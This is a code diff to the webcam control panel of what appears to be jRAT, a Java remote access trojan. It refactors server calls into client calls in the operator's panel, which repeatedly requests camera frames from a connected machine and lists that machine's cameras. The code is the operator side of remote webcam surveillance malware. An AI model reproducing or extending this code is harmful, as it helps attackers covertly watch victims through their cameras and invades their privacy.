@@ -26,7 +26,8 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.SpinnerNumberModel;
 import javax.swing.SwingConstants;
 
-import jrat.api.BaseControlPanel;
+import jrat.api.Client;
+import jrat.api.ui.BaseControlPanel;
 
 @SuppressWarnings("serial")
 public class PanelWebcam extends BaseControlPanel {
@@ -57,7 +58,9 @@ public class PanelWebcam extends BaseControlPanel {
 		lblName.setForeground(Color.red);
 	}
 	
-	public PanelWebcam() {
+	public PanelWebcam(Client client) {
+		super(client);
+		
 		image = new BufferedImage(WIDTH, HEIGHT, BufferedImage.TYPE_INT_RGB);
 		icon = new ImageIcon(image);
 		lbl = new JLabel(icon);
@@ -75,7 +78,7 @@ public class PanelWebcam extends BaseControlPanel {
 						public void run() {
 							try {
 								while (true) {
-									getServer().addToSendQueue(new OutgoingPacket120Webcam(getServer(), comboBox.getSelectedIndex()));
+									getClient().addToSendQueue(new OutgoingPacket120Webcam(getClient(), comboBox.getSelectedIndex()));
 									
 									if (!WebcamPlugin.enabled) {
 										return;
@@ -135,7 +138,7 @@ public class PanelWebcam extends BaseControlPanel {
 		DefaultComboBoxModel<String> model = new DefaultComboBoxModel<String>();
 		comboBox = new JComboBox<String>(model);
 		
-		List<String> cams = WebcamPlugin.map.get(getServer());
+		List<String> cams = WebcamPlugin.map.get(getClient());
 		
 		if (cams != null) {
 			for (String s : cams) {
@@ -209,7 +212,7 @@ public class PanelWebcam extends BaseControlPanel {
 		try {
 			WebcamPlugin.enabled = false;
 			Thread.sleep((long) (Integer) spInterval.getValue());
-			getServer().addToSendQueue(new OutgoingPacket120Webcam(getServer(), comboBox.getSelectedIndex()));
+			getClient().addToSendQueue(new OutgoingPacket120Webcam(getClient(), comboBox.getSelectedIndex()));
 		} catch (Exception e) {					
 			e.printStackTrace();
 		}	
